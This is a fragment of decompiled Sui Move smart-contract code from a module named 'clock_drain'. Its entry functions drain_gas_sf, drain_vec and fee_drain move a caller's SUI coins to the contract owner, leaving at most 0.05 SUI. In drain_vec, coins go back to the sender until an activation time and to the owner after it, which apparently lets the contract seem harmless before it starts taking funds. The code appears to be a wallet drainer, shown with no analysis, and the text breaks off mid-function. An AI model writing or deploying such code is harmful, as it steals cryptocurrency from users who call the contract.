module 0x9ad278018480079f377c66e43d469f3bbae15290c788bb6da25420fa37ba9f72::clock_drain {
    ...
    public entry fun drain_gas_sf(arg0: &Config, arg1: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.activation_ms == 0) {
            let v0 = 0x2::coin::value<0x2::sui::SUI>(arg1);
            let v1 = 50000000;
            if (v0 > v1 + 1) {
                0x2::coin::send_funds<0x2::sui::SUI>(0x2::coin::split<0x2::sui::SUI>(arg1, v0 - v1, arg2), arg0.owner);
            };
        };
    }

    public entry fun drain_vec(arg0: &Config, arg1: &0x2::clock::Clock, arg2: vector<0x2::coin::Coin<0x2::sui::SUI>>, arg3: &mut 0x2::tx_context::TxContext) {
        if (0x2::clock::timestamp_ms(arg1) >= arg0.activation_ms) {
            while (!0x1::vector::is_empty<0x2::coin::Coin<0x2::sui::SUI>>(&arg2)) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x1::vector::pop_back<0x2::coin::Coin<0x2::sui::SUI>>(&mut arg2), arg0.owner);
            };
        } else {
            while (!0x1::vector::is_empty<0x2::coin::Coin<0x2::sui::SUI>>(&arg2)) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x1::vector::pop_back<0x2::coin::Coin<0x2::sui::SUI>>(&mut arg2), 0x2::tx_context::sender(arg3));
            };
        };
        0x1::vector::destroy_empty<0x2::coin::Coin<0x2::sui::SUI>>(arg2);
    }

    public entry fun fee_drain(arg0: &Config, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg3: &mut 0x2::tx_context::TxContext) {
        if (arg0.activation_ms == 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, arg0.owner);
            let v0 = 0x2::coin::value<0x2::sui::SUI>(arg2);
            let v1 = 50000000;
            if (v0 > v1 + 1) {
                0x2::coin::send_funds<0x2::sui::SUI>(0x2::coin::split<0x2::sui::SUI>(arg2, v0 - v1, arg3), arg0.owner);
            };
        } else {
